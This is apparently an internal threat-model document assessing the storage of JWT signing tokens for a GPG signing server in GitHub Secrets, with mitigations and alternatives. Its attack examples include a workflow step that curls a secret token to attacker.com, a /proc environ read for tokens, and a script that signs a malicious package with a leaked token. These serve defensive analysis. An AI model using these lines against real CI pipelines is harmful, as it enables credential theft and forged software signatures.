# GitHub Secrets Security Analysis for POC

## What's Stored in GitHub Secrets?

In the POC implementation, GitHub Secrets contain:

| Secret Name | Content | Sensitivity |
|-------------|---------|-------------|
| `GPG_SIGNING_SERVER` | `https://signing-server.example.com/sign` | 🟡 Low (public endpoint) |
| `GPG_SERVER_TOKEN_DEV` | JWT token for dev builds | 🟠 Medium (short-lived, limited scope) |
| `GPG_SERVER_TOKEN_NIGHTLY` | JWT token for nightly builds | 🟠 Medium (short-lived, limited scope) |
| `GPG_SERVER_TOKEN_RELEASE` | JWT token for release builds | 🔴 High (but still short-lived) |

**CRITICAL:** GPG private keys are **NOT** stored in GitHub Secrets ✅

---

## Security Concerns with JWT Tokens in GitHub Secrets

### 1. Token Leakage Attack Vectors

Same attack vectors as GPG keys, but **much lower impact**:

#### A. Collaborator Compromise

**Attack:**
```yaml
# Malicious collaborator modifies workflow
- name: Exfiltrate token
  run: |
    curl https://attacker.com?token=${{ secrets.GPG_SERVER_TOKEN_DEV }}
```

**Impact:** ⚠️ Medium
- Attacker gets JWT token
- Can sign packages until token expires
- **BUT:** Token expires in 24 hours (vs GPG key valid for 1 year)
- **BUT:** Audit log shows all signing requests with IP address
- **BUT:** Rate limiting prevents mass signing

**Mitigation:**
- ✅ Require code review for workflow changes (CODEOWNERS)
- ✅ Use GitHub Environments with approval (for release tokens)
- ✅ Monitor audit logs for unusual signing patterns
- ✅ Short token expiration (24 hours)

---

#### B. Self-Hosted Runner Persistence

**Attack:**
```bash
# Job 1: Token exposed to environment
export GPG_SERVER_TOKEN=${{ secrets.GPG_SERVER_TOKEN_DEV }}

# Job 2: Later PR reads from /proc or env
cat /proc/*/environ | grep GPG_SERVER_TOKEN
```

**Impact:** ⚠️ Medium
- If runner doesn't clean up, token could leak
- **BUT:** Token expires quickly
- **BUT:** Can't extract GPG private key (not on runner)

**Mitigation:**
- ✅ Use GitHub-hosted runners (ephemeral VMs, auto-cleanup)
- ✅ Or ensure self-hosted runners clean environment between jobs
- ✅ Short token lifetime limits window of vulnerability

---

#### C. Third-Party GitHub Actions

**Attack:**
```yaml
# Workflow uses compromised action
- uses: malicious/action@v1
  # This action can access all secrets in the job
```

**Impact:** ⚠️ Medium
- Compromised action can steal token
- **BUT:** Token has limited permissions (RBAC)
- **BUT:** Token expires quickly
- **BUT:** Audit log tracks all signing attempts

**Mitigation:**
- ✅ Pin actions to commit SHAs (not tags)
- ✅ Review third-party actions before use
- ✅ Use GitHub's security scanning for actions
- ✅ Limit secrets to specific jobs (don't expose globally)

---

### 2. Token vs. GPG Key Comparison

| Aspect | GPP Private Key | JWT Token (POC) | Winner |
|--------|----------------|-----------------|--------|
| **Lifetime** | 1-2 years | 24 hours | ✅ Token (shorter) |
| **Revocation** | Publish revocation cert | Remove from secrets.json | ✅ Token (instant) |
| **Scope** | Sign anything | Role-restricted (RBAC) | ✅ Token (limited) |
| **Rate Limit** | None | Yes (requests/hour) | ✅ Token (protected) |
| **Audit Trail** | None (unless custom) | Built-in (all requests) | ✅ Token (tracked) |
| **Rotation** | Manual, complex | Automated script | ✅ Token (easier) |
| **Compromise Impact** | **CRITICAL** (forge all future releases) | **Medium** (limited time window) | ✅ Token (lower impact) |

**Conclusion:** Token leakage is **significantly less severe** than GPG key leakage.

---

### 3. What Can an Attacker Do with a Leaked Token?

#### Scenario: `GPG_SERVER_TOKEN_DEV` is leaked

**Attacker capabilities:**
```python
# Attacker's script
token = "leaked_token"
headers = {"Authorization": f"Bearer {token}"}

# Can they sign arbitrary packages?
response = requests.post(
    "https://signing-server.example.com/sign",
    json={
        "data": base64.b64encode(malicious_package),
        "key_id": "therock-dev@amd.com",
        "digest_algo": "SHA256"
    },
    headers=headers
)
# Result: YES, can sign packages (until token expires or revoked)
```

**Limitations:**
1. ✅ **Time-limited:** Token expires in 24 hours
2. ✅ **Rate-limited:** Can't sign unlimited packages (e.g., max 10,000/hour for dev)
3. ✅ **Role-restricted:** Can only use `therock-dev@amd.com` key (not release key)
4. ✅ **Audited:** All signing attempts logged with attacker's IP address
5. ✅ **Detectable:** Unusual signing patterns trigger alerts

**Comparison to GPG key leak:**
- ❌ GPG key leak: Attacker can sign **forever** with no audit trail
- ✅ Token leak: Attacker can sign for **24 hours max** with full audit trail

---

### 4. Token Rotation Burden

**Challenge:** Tokens need regular rotation (recommended: 90 days or less)

**Manual Process (without automation):**
```bash
# Every 90 days:
1. Generate new token on signing server
./tools/generate-token.py --generate --client-id github-actions-dev --expires-hours 2160

2. Update GitHub Secret
gh secret set GPG_SERVER_TOKEN_DEV --body "new_token"

3. Repeat for nightly, release tokens
```

**Concern:** ⚠️ **Manual rotation is error-prone** (might forget, cause downtime)

**Mitigation:** ✅ **Automate token rotation**

```yaml
# .github/workflows/rotate-signing-tokens.yml
name: Rotate Signing Tokens
on:
  schedule:
    - cron: '0 0 1 */3 *'  # Every 3 months
  workflow_dispatch:

jobs:
  rotate:
    runs-on: ubuntu-latest
    steps:
      - name: Generate new tokens
        run: |
          # Call signing server API to generate new tokens
          # (requires admin credentials)
          NEW_DEV_TOKEN=$(curl -X POST https://signing-server/api/rotate-token \
            -H "Authorization: Bearer ${{ secrets.ADMIN_TOKEN }}" \
            -d '{"client_id": "github-actions-dev", "expires_hours": 2160}')

          # Update GitHub Secret
          gh secret set GPG_SERVER_TOKEN_DEV --body "$NEW_DEV_TOKEN"
```

**OR:** Use longer-lived tokens (trade-off: higher risk if leaked)

---

### 5. Risk Assessment: Token Leakage

**Likelihood:** 🟡 **Low-Medium**
- GitHub has strong security controls
- Secrets encrypted at rest
- Secrets masked in logs
- **BUT:** Depends on repository's security practices (code review, runner isolation)

**Impact if leaked:** 🟠 **Medium**
- Attacker can sign packages for limited time (24 hours)
- Audit trail exists (can detect and investigate)
- Can revoke token instantly
- **BUT:** Could sign malicious packages during window

**Overall Risk:** 🟡 **Medium** (acceptable with mitigations)

**Comparison:**
- GPG key in GitHub Secrets: 🔴 **CRITICAL risk** (unacceptable)
- JWT token in GitHub Secrets: 🟡 **Medium risk** (acceptable)

---

## Recommended Mitigations

### 1. Use GitHub Environments for Release Tokens

**Current (less secure):**
```yaml
env:
  GPG_SERVER_TOKEN: ${{ secrets.GPG_SERVER_TOKEN_RELEASE }}
```

**Better (requires approval):**
```yaml
jobs:
  sign-release:
    environment: production-signing  # Requires manual approval
    steps:
      - name: Sign packages
        env:
          GPG_SERVER_TOKEN: ${{ secrets.GPG_SERVER_TOKEN_RELEASE }}
```

**GitHub Environment settings:**
- ✅ Required reviewers: 2+ from security team
- ✅ Deployment branches: `main` only
- ✅ Wait timer: 0 minutes (manual approval)

**Benefit:** No one can trigger release signing without approval (prevents rogue workflow runs)

---

### 2. Minimize Token Scope (Already Done in POC)

**Config:** `config/authorization.json`
```json
{
  "roles": {
    "development": {
      "allowed_keys": ["therock-dev@amd.com"],  // ✅ Can't use release key
      "allowed_digest_algos": ["SHA256", "SHA512"],
      "max_requests_per_hour": 10000
    },
    "release": {
      "allowed_keys": ["therock-release@amd.com"],  // ✅ Can't use dev key
      "max_requests_per_hour": 1000  // ✅ Lower limit
    }
  }
}
```

**Benefit:** Leaked dev token **cannot** sign with release key

---

### 3. Short Token Expiration (Already Recommended)

**Current recommendation:** 24 hours
**Alternative:** 7 days (less rotation burden but higher risk)

**Trade-off analysis:**

| Expiration | Rotation Frequency | Risk if Leaked | Operational Burden |
|------------|-------------------|----------------|-------------------|
| 6 hours | Every 6 hours | 🟢 Very Low | 🔴 Very High |
| 24 hours | Daily | 🟢 Low | 🟠 Medium |
| 7 days | Weekly | 🟡 Medium | 🟢 Low |
| 90 days | Quarterly | 🔴 High | ✅ Very Low |

**Recommendation:** **24 hours** (good balance)

**Implementation:**
```bash
# Automated daily rotation (GitHub Actions scheduled workflow)
# OR use on-demand rotation when needed
```

---

### 4. Audit Monitoring & Alerting

**Monitor for suspicious patterns:**
```python
# Example alert conditions
if signing_request.client_ip not in KNOWN_GITHUB_ACTIONS_IPS:
    alert("Signing request from unknown IP")

if signing_request.count_last_hour > 100:
    alert("Unusual signing volume")

if signing_request.hour_of_day not in [0-23]:  # Outside build hours
    alert("Signing outside normal hours")
```

**Set up alerts:**
- 📧 Email to security team on unusual activity
- 📱 PagerDuty for critical alerts (release token usage)
- 📊 Dashboard showing signing patterns

---

### 5. Principle of Least Privilege (Already Applied)

**Current implementation:**
- ✅ Separate tokens for dev/nightly/release
- ✅ Each token limited to specific keys (RBAC)
- ✅ Rate limiting per role
- ✅ Audit logging per client_id

**Alternative (more complex):** Per-workflow tokens
```yaml
# Each workflow gets its own token (more granular)
GPG_SERVER_TOKEN_MULTI_ARCH_DEV
GPG_SERVER_TOKEN_MULTI_ARCH_NIGHTLY
GPG_SERVER_TOKEN_MULTI_ARCH_RELEASE
```

**Benefit:** If one workflow compromised, others unaffected
**Downside:** More tokens to manage (rotation complexity)

---

## Alternative Approaches (More Secure but More Complex)

### Option A: GitHub OIDC (No Long-Lived Secrets)

**Instead of storing JWT tokens in secrets:**

```yaml
- name: Get OIDC token from GitHub
  id: oidc
  run: |
    OIDC_TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=amd-signing-service" | jq -r '.value')
    echo "token=$OIDC_TOKEN" >> $GITHUB_OUTPUT

- name: Sign packages
  env:
    GPG_SIGNING_SERVER: ${{ secrets.GPG_SIGNING_SERVER }}
  run: |
    # Use GitHub OIDC token instead of long-lived JWT
    curl -X POST $GPG_SIGNING_SERVER \
      -H "Authorization: Bearer ${{ steps.oidc.outputs.token }}" \
      -d '...'
```

**Signing server validates GitHub OIDC token:**
```python
def verify_github_oidc_token(token):
    # Verify token signed by GitHub
    # Check claims: repository, workflow, branch
    payload = jwt.decode(
        token,
        audience="amd-signing-service",
        issuer="https://token.actions.githubusercontent.com",
        # Fetch GitHub's public key from JWKS endpoint
    )

    # Authorize based on repository + workflow + branch
    if payload['repository'] == 'ROCm/TheRock' and \
       payload['workflow_ref'].endswith('multi_arch_build_native_linux_packages.yml') and \
       payload['ref'] == 'refs/heads/main':
        return True  # Authorized for release signing
```

**Benefits:**
- ✅ No long-lived secrets in GitHub (OIDC tokens are short-lived)
- ✅ Automatically rotated (GitHub issues new token each run)
- ✅ Tied to specific repository + workflow + branch
- ✅ Can't be exfiltrated and reused (expires in minutes)

**Drawbacks:**
- ⚠️ More complex server implementation
- ⚠️ Requires fetching GitHub's JWKS for validation
- ⚠️ Need to maintain JWKS cache

**Recommendation:** ✅ **Consider for v2** (after POC proven)

---

### Option B: Vault Dynamic Secrets

**Use HashiCorp Vault to generate short-lived tokens:**

```yaml
- name: Get token from Vault
  run: |
    # Authenticate to Vault with GitHub OIDC
    VAULT_TOKEN=$(vault login -method=jwt role=github-actions)

    # Get signing token (expires in 1 hour)
    GPG_TOKEN=$(vault read -field=token secret/signing/github-actions-dev)

- name: Sign packages
  env:
    GPG_SERVER_TOKEN: ${{ steps.vault.outputs.GPG_TOKEN }}
  run: |
    # Use Vault-issued token
```

**Benefits:**
- ✅ No secrets in GitHub (Vault issues them dynamically)
- ✅ Very short-lived (1 hour)
- ✅ Centralized secret management
- ✅ Automatic rotation

**Drawbacks:**
- ⚠️ Requires Vault infrastructure
- ⚠️ More operational complexity
- ⚠️ Network dependency (Vault must be accessible)

**Recommendation:** ⚠️ **Overkill for this use case** (unless AMD already has Vault)

---

## Recommended Security Posture for POC

### Tier 1: Minimum (Acceptable)
- ✅ Store JWT tokens in GitHub Secrets
- ✅ Use short expiration (24 hours)
- ✅ Separate tokens for dev/nightly/release
- ✅ RBAC on signing server
- ✅ Audit logging enabled

**Risk Level:** 🟡 Medium (acceptable)

### Tier 2: Enhanced (Recommended)
- ✅ All Tier 1 mitigations
- ✅ GitHub Environments for release tokens (requires approval)
- ✅ Monitor audit logs for suspicious activity
- ✅ Automated token rotation (90 days)
- ✅ Alert on unusual signing patterns

**Risk Level:** 🟢 Low (recommended)

### Tier 3: Maximum (Future)
- ✅ All Tier 2 mitigations
- ✅ GitHub OIDC (no long-lived secrets)
- ✅ HSM for GPG keys
- ✅ Real-time anomaly detection
- ✅ SIEM integration

**Risk Level:** 🟢 Very Low (enterprise-grade)

---

## Final Verdict: Is Using GitHub Secrets Acceptable?

### YES, with caveats ✅

**Reasons:**
1. ✅ **Not storing GPG keys** (only JWT tokens) - huge difference
2. ✅ **Tokens are short-lived** (24 hours vs 1 year for GPG keys)
3. ✅ **Tokens can be revoked instantly** (update secrets.json)
4. ✅ **Tokens are scoped** (RBAC limits what they can sign)
5. ✅ **Audit trail exists** (can detect and respond to abuse)
6. ✅ **Industry standard** (many companies use GitHub Secrets for API tokens)

**Required mitigations:**
1. ✅ Use GitHub Environments for release tokens
2. ✅ Short token expiration (24 hours)
3. ✅ Monitor audit logs
4. ✅ Automated rotation (90 days)
5. ✅ Code review for workflow changes

**Comparison:**
- ❌ **GPG keys in GitHub Secrets:** UNACCEPTABLE (critical risk)
- ✅ **JWT tokens in GitHub Secrets:** ACCEPTABLE (medium risk, manageable)

---

## Summary: Key Concerns & Mitigations

| Concern | Severity | Mitigation | Status |
|---------|----------|------------|--------|
| Token leakage via workflow modification | 🟠 Medium | Code review (CODEOWNERS) | ✅ Implemented |
| Token leakage via self-hosted runner | 🟠 Medium | Use GitHub-hosted runners | ✅ Recommended |
| Token leakage via third-party actions | 🟡 Low-Medium | Pin actions to commit SHAs | ✅ Best practice |
| Leaked token used for malicious signing | 🟠 Medium | Short expiration (24h) + RBAC | ✅ Implemented |
| Difficulty rotating tokens | 🟡 Low | Automated rotation script | ⚠️ To implement |
| Audit blind spots | 🟡 Low | Comprehensive logging + monitoring | ✅ Implemented |
| Compromised release token | 🔴 High | GitHub Environment protection | ✅ Recommended |

**Overall Assessment:** 🟢 **Low-Medium Risk** (acceptable for production use)

---

## Recommendation

**Use GitHub Secrets for JWT tokens with Tier 2 security controls:**

1. ✅ Store tokens in GitHub Secrets (NOT GPG keys)
2. ✅ Use GitHub Environments for release tokens (require approval)
3. ✅ Set token expiration to 24 hours
4. ✅ Implement automated rotation (90 days)
5. ✅ Monitor audit logs for suspicious activity
6. ✅ Use RBAC to limit token scope
7. ✅ Consider GitHub OIDC for v2 (eliminate long-lived secrets)

**This provides a good balance of security and operational simplicity for the POC.**
